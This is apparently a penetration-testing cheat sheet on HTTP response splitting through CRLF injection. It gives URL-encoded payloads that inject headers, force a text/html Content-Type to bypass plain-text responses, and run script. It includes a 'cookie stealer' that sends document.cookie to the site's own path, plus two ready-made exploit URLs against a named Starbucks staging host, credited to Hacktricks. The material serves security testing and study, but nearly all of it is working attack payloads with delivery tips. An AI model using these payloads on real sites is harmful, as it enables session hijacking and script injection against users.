The idea back Response splitting is to use **/r/n** tags to break the request stream and inject your own HTTP request in the URL to bypass WAF or other filter controls.

## Base payload
```
%0d%0a<html><script>alert(1)</script></html>
```
(You might have to URL encode the payload).

## Content-Type: text/plain Bypass
If the response is using this header then your XSS will not work and be rendered only as TEXT files, to bypass you have to ship the **Content-Type: text/html** as-well!
You can find the header in the response back in Burpsuite **Content-Type: text/plain.**
```
%0d%0aContent-Type: text/html%0d%0a%0d%0a<html><script>alert(1)</script></html>
```
(This might need to be URL encoded as well before sending the payload to the victim which will be something like.)

# Cookie stealer
```
%0d%0aContent-Type: text/html%0d%0a%0d%0a</html><script>new Image().src="/?admin=c"+document.cookie;</script></html>
```
(This will use the base path to ex-filtrate and by working with a HTTP2XX won't involve Same Site policies. )


# Other payloads that work into URL
(taken from Hacktricks) 
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E